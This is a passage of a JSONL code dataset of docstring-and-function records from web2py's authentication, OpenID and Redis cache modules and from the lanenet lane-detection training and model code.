self.add_membership(self.settings.everybody_group_id, result)\n\nif settings.registration_requires_verification:\n    d = {k: user[k] for k in table_user.fields if table_user[k].readable}\n    d['key'] = key\n    if settings.login_after_registration and not settings.registration_requires_approval:\n        self.login_user(user)\n    return {'errors': None, 'message': None, 'user': d}\n\nif settings.registration_requires_approval:\n    user.update_record(registration_key='pending')\n    message = self.messages.registration_pending\nelif settings.login_after_registration:\n    user.update_record(registration_key='')\n    self.login_user(user)\n    message = self.messages.logged_in\n\nself.log_event(log, user)\n\nreturn {'errors': None, 'message': message,\n        'user': {k: user[k] for k in table_user.fields if table_user[k].readable}}", "path": "web2py/gluon/authapi.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nThis helper function is not part of the interface. Given a list of\nassociation rows it checks which associations have expired and\ndeletes them from the db. It returns a tuple of the form\n([valid_assoc], no_of_expired_assoc_deleted).\n\"\"\"\n\n", "func_signal": "def _removeExpiredAssocations(self, rows):\n", "code": "db = self.database\nkeep_assoc = []\nremove_assoc = []\nt1970 = time.time()\nfor r in rows:\n    if r['issued'] + r['lifetime'] < t1970:\n        remove_assoc.append(r)\n    else:\n        keep_assoc.append(r)\nfor r in remove_assoc:\n    del db.oid_associations[r['id']]\nreturn (keep_assoc, len(remove_assoc))  # return tuple (list of valid associations, number of deleted associations)", "path": "web2py/gluon/contrib/login_methods/openid_auth.py", "commit_date": "2016-05-29 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nLogs out user\n\"\"\"\n", "func_signal": "def logout(self, log=DEFAULT, onlogout=DEFAULT, **kwargs):\n", "code": "settings = self.settings\nsession = current.session\n\nif onlogout is DEFAULT:\n    onlogout = settings.logout_onlogout\nif onlogout:\n    onlogout(self.user)\nif log is DEFAULT:\n    log = self.messages['logout_log']\nif self.user:\n    self.log_event(log, self.user)\n\nsession.auth = None\nself.user = None\nif settings.renew_session_onlogout:\n    session.renew(clear_session=not settings.keep_session_onlogout)\n\nreturn {'errors': None, 'message': self.messages.logged_out, 'user': None}", "path": "web2py/gluon/authapi.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nComplete the process and\n\"\"\"\n", "func_signal": "def process_response(self, request_vars, return_to_url):\n", "code": "resp = self.consumer.complete(request_vars, return_to_url)\nif resp:\n    if resp.status == openid.consumer.consumer.SUCCESS:\n        self.resp = resp\n        if hasattr(resp, \"identity_url\"):\n            self.session.w2popenid.oid = resp.identity_url\n        return \"success\"\n    if resp.status == openid.consumer.consumer.FAILURE:\n        self.error_message = resp.message\n        return \"failure\"\n    if resp.status == openid.consumer.consumer.CANCEL:\n        return \"cancel\"\n    if resp.status == openid.consumer.consumer.SETUP_NEEDED:\n        return \"setup_needed\"\nreturn \"no resp\"", "path": "web2py/gluon/contrib/login_methods/openid_auth.py", "commit_date": "2016-05-29 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nRemove expired associations from db and return the number\nof entries deleted.\n\"\"\"\n\n", "func_signal": "def cleanupAssociations(self):\n", "code": "db = self.database\nquery = (db.oid_associations.id > 0)\nreturn self._removeExpiredAssocations(db(query).select())[1]  # return number of assoc removed", "path": "web2py/gluon/contrib/login_methods/openid_auth.py", "commit_date": "2016-05-29 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nLets the user change password\n\nKeyword Args:\n    old_password (string) - User's current password\n    new_password (string) - User's new password\n    new_password2 (string) - Verify the new password\n\"\"\"\n", "func_signal": "def change_password(self, log=DEFAULT, **kwargs):\n", "code": "settings = self.settings\nmessages = self.messages\n\nif not self.is_logged_in():\n    raise AssertionError('User is not logged in')\n\ndb = self.db\ntable_user = self.table_user()\ns = db(table_user.id == self.user.id)\n\nrequest = current.request\nsession = current.session\npassfield = settings.password_field\n\nrequires = table_user[passfield].requires\nif not isinstance(requires, (list, tuple)):\n    requires = [requires]\nrequires = [t for t in requires if isinstance(t, CRYPT)]\nif requires:\n    requires[0] = CRYPT(**requires[0].__dict__) # Copy the existing CRYPT attributes\n    requires[0].min_length = 0 # But do not enforce minimum length for the old password\n\nold_password = kwargs.get('old_password', '')\nnew_password = kwargs.get('new_password', '')\nnew_password2 = kwargs.get('new_password2', '')\n\nvalidator_old = requires\nvalidator_pass2 = IS_EQUAL_TO(new_password, error_message=messages.mismatched_password)\n\nold_password, error_old = self.__validate(old_password, validator_old)\nnew_password2, error_new2 = self.__validate(new_password2, validator_pass2)\n\nerrors = {}\nif error_old:\n    errors['old_password'] = error_old\nif error_new2:\n    errors['new_password2'] = error_new2\nif errors:\n    return {'errors': errors, 'message': None}\n\ncurrent_user = s.select(limitby=(0, 1), orderby_on_limitby=False).first()\nif not old_password == current_user[passfield]:\n    return {'errors': {'old_password': messages.invalid_password}, 'message': None}\nelse:\n    d = {passfield: new_password}\n    resp = s.validate_and_update(**d)\n    if resp.errors:\n        return {'errors': {'new_password': resp.errors[passfield]}, 'message': None}\n    if log is DEFAULT:\n        log = messages['change_password_log']\n    self.log_event(log, self.user)\n    return {'errors': None, 'message': messages.password_changed}", "path": "web2py/gluon/authapi.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nAuxiliary function called by `clear` to search and\nclear cache entries\n\"\"\"\n", "func_signal": "def clear(self, regex):\n", "code": "r = re.compile(regex)\n# get all buckets\nbuckets = self.r_server.smembers(self.cache_set_key)\n# get all keys in buckets\nif buckets:\n    keys = self.r_server.sunion(buckets)\nelse:\n    return\nprefix = self.prefix\npipe = self.r_server.pipeline()\nfor a in keys:\n    if r.match(str(a).replace(prefix, '', 1)):\n        pipe.delete(a)\nif random.randrange(0, 100) < 10:\n    # do this just once in a while (10% chance)\n    self.clear_buckets(buckets)\npipe.execute()", "path": "web2py/gluon/contrib/redis_cache.py", "commit_date": "2019-09-25 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nThis method returns Falase if a nonce has been used before or its\ntimestamp is not current.\n\"\"\"\n\n", "func_signal": "def useNonce(self, server_url, timestamp, salt):\n", "code": "db = self.database\nif abs(timestamp - time.time()) > nonce.SKEW:\n    return False\nquery = (db.oid_nonces.server_url == server_url) & (db.oid_nonces.itimestamp == timestamp) & (db.oid_nonces.salt == salt)\nif db(query).count() > 0:\n    return False\nelse:\n    db.oid_nonces.insert(server_url=server_url,\n                         itimestamp=timestamp,\n                         salt=salt)\n    return True", "path": "web2py/gluon/contrib/login_methods/openid_auth.py", "commit_date": "2016-05-29 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nLogin a user\n\nKeyword Args:\n    username/email/name_of_your_username_field (string) - username\n    password/name_of_your_passfield (string) - user's password\n    remember_me (boolean) - extend the duration of the login to settings.long_expiration\n\"\"\"\n", "func_signal": "def login(self, log=DEFAULT, **kwargs):\n", "code": "settings = self.settings\nsession = current.session\ntable_user = self.table_user()\n\nif 'username' in table_user.fields or \\\n        not settings.login_email_validate:\n    userfield_validator = IS_NOT_EMPTY(error_message=self.messages.is_empty)\n    if not settings.username_case_sensitive:\n        userfield_validator = [IS_LOWER(), userfield_validator]\nelse:\n    userfield_validator = IS_EMAIL(error_message=self.messages.invalid_email)\n    if not settings.email_case_sensitive:\n        userfield_validator = [IS_LOWER(), userfield_validator]\n\npassfield = settings.password_field\n\nif log is DEFAULT:\n    log = self.messages['login_log']\n\nuser = None\n\n# Setup the default field used for the userfield\nif self.settings.login_userfield:\n    userfield = self.settings.login_userfield\nelse:\n    if 'username' in table_user.fields:\n        userfield = 'username'\n    else:\n        userfield = 'email'\n\n# Get the userfield from kwargs and validate it\nuserfield_value = kwargs.get(userfield)\nif userfield_value is None:\n    raise KeyError('%s not found in kwargs' % userfield)\n\nvalidated, error = self.__validate(userfield_value, userfield_validator)\n\nif error:\n    return {'errors': {userfield: error}, 'message': self.messages.invalid_login, 'user': None}\n\n# Get the user for this userfield and check it\nuser = table_user(**{userfield: validated})\n\nif user is None:\n    return {'errors': {userfield: self.messages.invalid_user},\n            'message': self.messages.invalid_login, 'user': None}\n\nif (user.registration_key or '').startswith('pending'):\n    return {'errors': None, 'message': self.messages.registration_pending, 'user': None}\nelif user.registration_key in ('disabled', 'blocked'):\n    return {'errors': None, 'message': self.messages.login_disabled, 'user': None}\nelif (user.registration_key is not None and user.registration_key.strip()):\n    return {'errors': None, 'message': self.messages.registration_verifying, 'user': None}\n\n# Finally verify the password\npassfield = settings.password_field\npassword = table_user[passfield].validate(kwargs.get(passfield, ''), None)[0]\n\nif password == user[passfield]:\n    self.login_user(user)\n    session.auth.expiration = \\\n        kwargs.get('remember_me', False) and \\\n        settings.long_expiration or \\\n        settings.expiration\n    session.auth.remember_me = kwargs.get('remember_me', False)\n    self.log_event(log, user)\n    return {'errors': None, 'message': self.messages.logged_in,\n            'user': {k: user[k] for k in table_user.fields if table_user[k].readable}}\nelse:\n    self.log_event(self.messages['login_failed_log'], kwargs)\n    return {'errors': {passfield: self.messages.invalid_password},\n            'message': self.messages.invalid_login, 'user': None}", "path": "web2py/gluon/authapi.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nCreates a group associated to a role\n\"\"\"\n", "func_signal": "def add_group(self, role, description=''):\n", "code": "group_id = self.table_group().insert(role=role, description=description)\nself.log_event(self.messages['add_group_log'], dict(group_id=group_id, role=role))\nreturn group_id", "path": "web2py/gluon/authapi.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nInitialize Web2pyStore\n\"\"\"\n", "func_signal": "def _init_store(self, db):\n", "code": "if not hasattr(self, \"store\"):\n    store = Web2pyStore(db)\n    session = self.session\n    if 'w2popenid' not in session:\n        session.w2popenid = Storage()\n    self.store = store\nreturn self.store", "path": "web2py/gluon/contrib/login_methods/openid_auth.py", "commit_date": "2016-05-29 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nDefine the OpenID login table.\nNote: oidtype is what I used for our project.\n      We're going to support 'fackbook' and\n      'plurk' alternate login methods.\n      Otherwise it's always 'openid' and you\n      may not need it. This should be easy to changed.\n      (Just remove the field of \"type\" and remove the\n      \"and db.alt_logins.oidtype == type_\"\n      in _find_matched_openid function)\n\"\"\"\n", "func_signal": "def _define_alt_login_table(self):\n", "code": "db = self.db\ntable = db.define_table(\n    self.table_alt_logins_name,\n    Field('username', length=512, default=''),\n    Field('oidtype', length=128, default='openid', readable=False),\n    Field('oiduser', self.table_user, readable=False),\n)\ntable.username.requires = IS_NOT_IN_DB(db, table.username)\nself.table_alt_logins = table", "path": "web2py/gluon/contrib/login_methods/openid_auth.py", "commit_date": "2016-05-29 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nCheck if w2popenid authentication is processed.\nReturn True if processed else False.\n\"\"\"\n", "func_signal": "def _processed(self):\n", "code": "processed = (hasattr(current.session, 'w2popenid') and\n             current.session.w2popenid.ok is True)\nreturn processed", "path": "web2py/gluon/contrib/login_methods/openid_auth.py", "commit_date": "2016-05-29 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nProcess the OpenID by ConsumerHelper.\n\"\"\"\n", "func_signal": "def _process_response(self):\n", "code": "request = current.request\nrequest_vars = request.vars\nconsumerhelper = self._init_consumerhelper()\nprocess_status = consumerhelper.process_response(\n    request_vars, self.return_to_url)\nif process_status == \"success\":\n    w2popenid = current.session.w2popenid\n    user_data = self.consumerhelper.sreg()\n    current.session.w2popenid.ok = True\n    self._set_w2popenid_expiration(w2popenid)\n    w2popenid.user_data = user_data\n    current.session.flash = self.messages.flash_openid_authenticated\nelif process_status == \"failure\":\n    flash = self.messages.flash_openid_fail_authentication % consumerhelper.error_message\n    current.session.warning = flash\nelif process_status == \"cancel\":\n    current.session.warning = self.messages.flash_openid_canceled\nelif process_status == \"setup_needed\":\n    current.session.warning = self.messages.flash_openid_need_setup", "path": "web2py/gluon/contrib/login_methods/openid_auth.py", "commit_date": "2016-05-29 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nSet expiration for OpenID authentication.\n\"\"\"\n", "func_signal": "def _set_w2popenid_expiration(self, w2popenid):\n", "code": "w2popenid.expiration = datetime.now(\n) + timedelta(minutes=self.openid_expiration)", "path": "web2py/gluon/contrib/login_methods/openid_auth.py", "commit_date": "2016-05-29 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nStart to process the OpenID response if 'janrain_nonce' in request parameters\nand not processed yet. Else return the OpenID form for login.\n\"\"\"\n", "func_signal": "def login_form(self):\n", "code": "request = current.request\nif 'janrain_nonce' in request.vars and not self._processed():\n    self._process_response()\n    return self.auth()\nreturn self._form()", "path": "web2py/gluon/contrib/login_methods/openid_auth.py", "commit_date": "2016-05-29 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nExamples:\n    Use as::\n\n        auth.log_event(description='this happened', origin='auth')\n\n\"\"\"\n", "func_signal": "def log_event(self, description, vars=None, origin='auth'):\n", "code": "if not self.settings.logging_enabled or not description:\n    return\nelif self.is_logged_in():\n    user_id = self.user.id\nelse:\n    user_id = None  # user unknown\nvars = vars or {}\n# log messages should not be translated\nif type(description).__name__ == 'lazyT':\n    description = description.m\nif not user_id or self.table_user()[user_id]:\n    self.table_event().insert(\n        description=str(description % vars), origin=origin, user_id=user_id)", "path": "web2py/gluon/authapi.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nRevokes membership from group_id to user_id\nif user_id is None than user_id is that of current logged in user\n\"\"\"\n\n", "func_signal": "def del_membership(self, group_id=None, user_id=None, role=None):\n", "code": "group_id = group_id or self.id_group(role)\ntry:\n    group_id = int(group_id)\nexcept:\n    group_id = self.id_group(group_id)  # interpret group_id as a role\nif not user_id and self.user:\n    user_id = self.user.id\nmembership = self.table_membership()\nself.log_event(self.messages['del_membership_log'],\n               dict(user_id=user_id, group_id=group_id))\nret = self.db(membership.user_id == user_id)(membership.group_id == group_id).delete()\nif group_id in self.user_groups and user_id == self.user_id:\n    del self.user_groups[group_id]\nreturn ret", "path": "web2py/gluon/authapi.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\nReturns the group_id of the group specified by the role\n\"\"\"\n", "func_signal": "def id_group(self, role):\n", "code": "rows = self.db(self.table_group().role == role).select()\nif not rows:\n    return None\nreturn rows[0].id", "path": "web2py/gluon/authapi.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "web2py/web2py", "stars": 2073, "license": "other", "language": "python", "size": 42904}
{"docstring": "\"\"\"\n\n:param input_tensor:\n:param name:\n:param reuse:\n:return:\n\"\"\"\n", "func_signal": "def build_model(self, input_tensor, name, reuse=False):\n", "code": "with tf.variable_scope(name_or_scope=name, reuse=reuse):\n    # vgg16 fcn encode part\n    self._vgg16_fcn_encode(input_tensor=input_tensor, name='vgg16_encode_module')\n    # vgg16 fcn decode part\n    self._vgg16_fcn_decode(name='vgg16_decode_module')\n\nreturn self._net_intermediate_results", "path": "lanenet-lane-detection/semantic_segmentation_zoo/vgg16_based_fcn.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\n\n:param onehot_labels:\n:param logits:\n:param classes_weights:\n:return:\n\"\"\"\n", "func_signal": "def _compute_class_weighted_cross_entropy_loss(cls, onehot_labels, logits, classes_weights):\n", "code": "loss_weights = tf.reduce_sum(tf.multiply(onehot_labels, classes_weights), axis=3)\n\nloss = tf.losses.softmax_cross_entropy(\n    onehot_labels=onehot_labels,\n    logits=logits,\n    weights=loss_weights\n)\n\nreturn loss", "path": "lanenet-lane-detection/lanenet_model/lanenet_back_end.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\n\n:return:\n\"\"\"\n", "func_signal": "def init_args():\n", "code": "parser = argparse.ArgumentParser()\nparser.add_argument('--image_dir', type=str, help='The source tusimple lane test data dir')\nparser.add_argument('--weights_path', type=str, help='The model weights path')\nparser.add_argument('--save_dir', type=str, help='The test output save root dir')\n\nreturn parser.parse_args()", "path": "lanenet-lane-detection/tools/evaluate_lanenet_on_tusimple.py", "commit_date": "2020-09-24 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\n\n:param input_tensor:\n:param name:\n:return:\n\"\"\"\n", "func_signal": "def _vgg16_fcn_encode(self, input_tensor, name):\n", "code": "with tf.variable_scope(name_or_scope=name):\n    # encode stage 1\n    conv_1_1 = self._vgg16_conv_stage(\n        input_tensor=input_tensor, k_size=3,\n        out_dims=64, name='conv1_1',\n        need_layer_norm=True\n    )\n    conv_1_2 = self._vgg16_conv_stage(\n        input_tensor=conv_1_1, k_size=3,\n        out_dims=64, name='conv1_2',\n        need_layer_norm=True\n    )\n    self._net_intermediate_results['encode_stage_1_share'] = {\n        'data': conv_1_2,\n        'shape': conv_1_2.get_shape().as_list()\n    }\n\n    # encode stage 2\n    pool1 = self.maxpooling(\n        inputdata=conv_1_2, kernel_size=2,\n        stride=2, name='pool1'\n    )\n    conv_2_1 = self._vgg16_conv_stage(\n        input_tensor=pool1, k_size=3,\n        out_dims=128, name='conv2_1',\n        need_layer_norm=True\n    )\n    conv_2_2 = self._vgg16_conv_stage(\n        input_tensor=conv_2_1, k_size=3,\n        out_dims=128, name='conv2_2',\n        need_layer_norm=True\n    )\n    self._net_intermediate_results['encode_stage_2_share'] = {\n        'data': conv_2_2,\n        'shape': conv_2_2.get_shape().as_list()\n    }\n\n    # encode stage 3\n    pool2 = self.maxpooling(\n        inputdata=conv_2_2, kernel_size=2,\n        stride=2, name='pool2'\n    )\n    conv_3_1 = self._vgg16_conv_stage(\n        input_tensor=pool2, k_size=3,\n        out_dims=256, name='conv3_1',\n        need_layer_norm=True\n    )\n    conv_3_2 = self._vgg16_conv_stage(\n        input_tensor=conv_3_1, k_size=3,\n        out_dims=256, name='conv3_2',\n        need_layer_norm=True\n    )\n    conv_3_3 = self._vgg16_conv_stage(\n        input_tensor=conv_3_2, k_size=3,\n        out_dims=256, name='conv3_3',\n        need_layer_norm=True\n    )\n    self._net_intermediate_results['encode_stage_3_share'] = {\n        'data': conv_3_3,\n        'shape': conv_3_3.get_shape().as_list()\n    }\n\n    # encode stage 4\n    pool3 = self.maxpooling(\n        inputdata=conv_3_3, kernel_size=2,\n        stride=2, name='pool3'\n    )\n    conv_4_1 = self._vgg16_conv_stage(\n        input_tensor=pool3, k_size=3,\n        out_dims=512, name='conv4_1',\n        need_layer_norm=True\n    )\n    conv_4_2 = self._vgg16_conv_stage(\n        input_tensor=conv_4_1, k_size=3,\n        out_dims=512, name='conv4_2',\n        need_layer_norm=True\n    )\n    conv_4_3 = self._vgg16_conv_stage(\n        input_tensor=conv_4_2, k_size=3,\n        out_dims=512, name='conv4_3',\n        need_layer_norm=True\n    )\n    self._net_intermediate_results['encode_stage_4_share'] = {\n        'data': conv_4_3,\n        'shape': conv_4_3.get_shape().as_list()\n    }\n\n    # encode stage 5 for binary segmentation\n    pool4 = self.maxpooling(\n        inputdata=conv_4_3, kernel_size=2,\n        stride=2, name='pool4'\n    )\n    conv_5_1_binary = self._vgg16_conv_stage(\n        input_tensor=pool4, k_size=3,\n        out_dims=512, name='conv5_1_binary',\n        need_layer_norm=True\n    )\n    conv_5_2_binary = self._vgg16_conv_stage(\n        input_tensor=conv_5_1_binary, k_size=3,\n        out_dims=512, name='conv5_2_binary',\n        need_layer_norm=True\n    )\n    conv_5_3_binary = self._vgg16_conv_stage(\n        input_tensor=conv_5_2_binary, k_size=3,\n        out_dims=512, name='conv5_3_binary',\n        need_layer_norm=True\n    )\n    self._net_intermediate_results['encode_stage_5_binary'] = {\n        'data': conv_5_3_binary,\n        'shape': conv_5_3_binary.get_shape().as_list()\n    }\n\n    # encode stage 5 for instance segmentation\n    conv_5_1_instance = self._vgg16_conv_stage(\n        input_tensor=pool4, k_size=3,\n        out_dims=512, name='conv5_1_instance',\n        need_layer_norm=True\n    )\n    conv_5_2_instance = self._vgg16_conv_stage(\n        input_tensor=conv_5_1_instance, k_size=3,\n        out_dims=512, name='conv5_2_instance',\n        need_layer_norm=True\n    )\n    conv_5_3_instance = self._vgg16_conv_stage(\n        input_tensor=conv_5_2_instance, k_size=3,\n        out_dims=512, name='conv5_3_instance',\n        need_layer_norm=True\n    )\n    self._net_intermediate_results['encode_stage_5_instance'] = {\n        'data': conv_5_3_instance,\n        'shape': conv_5_3_instance.get_shape().as_list()\n    }\n\nreturn", "path": "lanenet-lane-detection/semantic_segmentation_zoo/vgg16_based_fcn.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\n\n:param warmup_steps:\n:param name:\n:return:\n\"\"\"\n", "func_signal": "def _compute_warmup_lr(self, warmup_steps, name):\n", "code": "with tf.variable_scope(name_or_scope=name):\n    factor = tf.math.pow(self._init_learning_rate / self._warmup_init_learning_rate, 1.0 / warmup_steps)\n    warmup_lr = self._warmup_init_learning_rate * tf.math.pow(factor, self._global_step)\nreturn warmup_lr", "path": "lanenet-lane-detection/trainner/tusimple_lanenet_single_gpu_trainner.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\nif the net is used for training or not\n:return:\n\"\"\"\n", "func_signal": "def _is_net_for_training(self):\n", "code": "if isinstance(self._phase, tf.Tensor):\n    phase = self._phase\nelse:\n    phase = tf.constant(self._phase, dtype=tf.string)\n\nreturn tf.equal(phase, tf.constant('train', dtype=tf.string))", "path": "lanenet-lane-detection/semantic_segmentation_zoo/vgg16_based_fcn.py", "commit_date": "2020-09-23 00:00:00", "repo_name": "MaybeShewill-CV/lanenet-lane-detection", "stars": 2214, "license": "apache-2.0", "language": "python", "size": 61888}
{"docstring": "\"\"\"\n\n:return:\n\"\"\"\n", "func_signal": "def train(self):\n", "code": "self._sess.run(tf.global_variables_initializer())\nself._sess.run(tf.local_variables_initializer())\nif self._cfg.TRAIN.RESTORE_FROM_SNAPSHOT.ENABLE:\n    try:\n        LOG.info('=> Restoring weights from: {:s} ... '.format(self._initial_weight))\n        self._loader.restore(self._sess, self._initial_weight)\n        global_step_value = self._sess.run(self._global_step)\n        remain_epoch_nums = self._train_epoch_nums - math.floor(global_step_value / self._steps_per_epoch)\n        epoch_start_pt = self._train_epoch_nums - remain_epoch_nums\n    except OSError as e:\n        LOG.error(e)\n        LOG.info('=> {:s} does not exist !!!'.format(self._initial_weight))\n        LOG.info('=> Now it starts to train LaneNet from scratch ...')\n        epoch_start_pt = 1\n    except Exception as e:\n        LOG.error(e)\n        LOG.info('=> Can not load pretrained model weights: {:s}'.format(self._initial_weight))\n        LOG.info('=> Now it starts to train LaneNet from scratch ...')\n        epoch_start_pt = 1\nelse:\n    LOG.info('=> Starts to train LaneNet from scratch ...')\n    epoch_start_pt = 1\n\nbest_model = []\nfor epoch in range(epoch_start_pt, self._train_epoch_nums):\n    # training part\n    train_epoch_losses = []\n    train_epoch_mious = []\n    traindataset_pbar = tqdm.tqdm(range(1, self._steps_per_epoch))\n    for _ in traindataset_pbar:\n        if self._enable_miou and epoch % self._record_miou_epoch == 0:\n            _, _, summary, train_step_loss, train_step_binary_loss, \\\n                train_step_instance_loss, global_step_val = self._sess.run(\n                    fetches=[\n                        self._train_op, self._miou_update_op, self._write_summary_op_with_miou,\n                        self._loss, self._binary_loss, self._instance_loss,\n                        self._global_step\n                    ]\n            )\n            train_step_miou = self._sess.run(\n                fetches=self._miou\n            )\n            train_epoch_losses.append(train_step_loss)\n            train_epoch_mious.append(train_step_miou)\n            self._summary_writer.add_summary(summary, global_step=global_step_val)\n            traindataset_pbar.set_description(\n                'train loss: {:.5f}, b_loss: {:.5f}, i_loss: {:.5f}, miou: {:.5f}'.format(\n                    train_step_loss, train_step_binary_loss, train_step_instance_loss, train_step_miou\n                )\n            )\n        else:\n            _, summary, train_step_loss, train_step_binary_loss, \\\n                train_step_instance_loss, global_step_val = self._sess.run(\n                    fetches=[\n                        self._train_op, self._write_summary_op,\n                        self._loss, self._binary_loss, self._instance_loss,\n                        self._global_step\n                    ]\n            )\n            train_epoch_losses.append(train_step_loss)\n            self._summary_writer.add_summary(summary, global_step=global_step_val)\n            traindataset_pbar.set_description(\n                'train loss: {:.5f}, b_loss: {:.5f}, i_loss: {:.5f}'.format(\n                    train_step_loss, train_step_binary_loss, train_step_instance_loss\n                )\n            )\n\n    train_epoch_losses = np.mean(train_epoch_losses)\n    if self._enable_miou and epoch % self._record_miou_epoch == 0:\n        train_epoch_mious = np.mean(train_epoch_mious)\n\n    # validation part\n    val_epoch_losses = []\n    val_epoch_mious = []\n    valdataset_pbar = tqdm.tqdm(range(1, self._val_steps_per_epoch))\n    for _ in valdataset_pbar:\n        try:\n            if self._enable_miou and epoch % self._record_miou_epoch == 0:\n                _, val_summary, val_step_loss, val_step_binary_loss, \\\n                    val_step_instance_loss, val_global_step_val = self._sess.run(\n                            fetches=[\n                                self._val_miou_update_op, self._val_write_summary_op_with_miou,\n                                self._val_loss, self._val_binary_loss, self._val_instance_loss,\n                                self._val_global_step\n                            ]\n                    )\n                val_step_miou = self._sess.run(\n                    fetches=self._val_miou\n                )\n                val_epoch_losses.append(val_step_loss)\n                val_epoch_mious.append(val_step_miou)\n                self._summary_writer.add_summary(val_summary, global_step=val_global_step_val)\n                valdataset_pbar.set_description(\n                    'val loss: {:.5f}, b_loss: {:.5f}, i_loss: {:.5f}, val miou: {:.5f}'.format(\n                        val_step_loss, val_step_binary_loss, val_step_instance_loss, val_step_miou)\n                )\n            else:\n                val_summary, val_step_loss, val_step_binary_loss, \\\n                    val_step_instance_loss, val_global_step_val = self._sess.run(\n                        fetches=[\n                            self._val_write_summary_op,\n                            self._val_loss, self._val_binary_loss, self._val_instance_loss,\n                            self._val_global_step\n                        ]\n                    )\n                val_epoch_losses.append(val_step_loss)\n                self._summary_writer.add_summary(val_summary, global_step=val_global_step_val)\n                valdataset_pbar.set_description(\n                    'val loss: {:.5f} b_loss: {:.5f}, i_loss: {:.5f}'.format(\n                        val_step_loss, val_step_binary_loss, val_step_instance_loss\n                    )\n                )\n        except tf.errors.OutOfRangeError as _:\n            break\n    val_epoch_losses = np.mean(val_epoch_losses)\n    if self._enable_miou and epoch % self._record_miou_epoch == 0:\n        val_epoch_mious = np.mean(val_epoch_mious)\n\n    # model saving part\n    if epoch % self._snapshot_epoch == 0:\n        if self._enable_miou:\n            if len(best_model) < 10:\n                best_model.append(val_epoch_mious)\n                best_model = sorted(best_model)\n                snapshot_model_name = 'tusimple_val_miou={:.4f}.ckpt'.format(val_epoch_mious)\n                snapshot_model_path = ops.join(self._model_save_dir, snapshot_model_name)\n                os.makedirs(self._model_save_dir, exist_ok=True)\n                self._saver.save(self._sess, snapshot_model_path, global_step=epoch)\n            else:\n                best_model = sorted(best_model)\n                if val_epoch_mious > best_model[0]:\n                    best_model[0] = val_epoch_mious\n                    best_model = sorted(best_model)\n                    snapshot_model_name = 'tusimple_val_miou={:.4f}.ckpt'.format(val_epoch_mious)\n                    snapshot_model_path = ops.join(self._model_save_dir, snapshot_model_name)\n                    os.makedirs(self._model_save_dir, exist_ok=True)\n                    self._saver.save(self._sess, snapshot_model_path, global_step=epoch)\n                else:\n                    pass\n        else:\n            snapshot_model_name = 'tusimple_val_loss={:.4f}.ckpt'.format(val_epoch_losses)\n            snapshot_model_path = ops.join(self._model_save_dir, snapshot_model_name)\n            os.makedirs(self._model_save_dir, exist_ok=True)\n            self._saver.save(self._sess, snapshot_model_path, global_step=epoch)\n\n    log_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))\n    if self._enable_miou and epoch % self._record_miou_epoch == 0:\n        LOG.info(\n            '=> Epoch: {:d} Time: {:s} Train loss: {:.5f} Train miou: {:.5f} '\n            'Val loss: {:.5f} Val miou: {:.5f}...'.format(\n                epoch, log_time,\n                train_epoch_losses,\n                train_epoch_mious,\n                val_epoch_losses,\n                val_epoch_mious\n            )\n        )\n    else:\n        LOG.info(\n            '=> Epoch: {:d} Time: {:s} Train loss: {:.5f} Val loss: {:.5f}...'.format(\n                epoch, log_time,\n                train_epoch_losses,\n                